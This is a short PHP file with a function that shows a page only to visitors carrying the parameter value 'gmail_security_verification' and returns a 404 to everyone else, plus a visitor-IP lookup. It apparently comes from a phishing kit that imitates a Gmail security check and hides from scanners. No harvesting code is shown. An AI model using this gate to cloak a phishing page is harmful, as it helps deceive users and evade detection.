<?php

function VerifyRid()
{
    if (!isset($_GET['rid'])) {
        if (!isset($_COOKIE['rid'])) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }
    } else {
        if ($_GET['rid'] !== "gmail_security_verification") {
            header("HTTP/1.0 404 Not Found");
            exit();
        } else {
            setcookie("rid", 1);
        }
    }
}

function getUserIP()
{
    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') > 0) {
            $addr = explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($addr[0]);
        } else {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
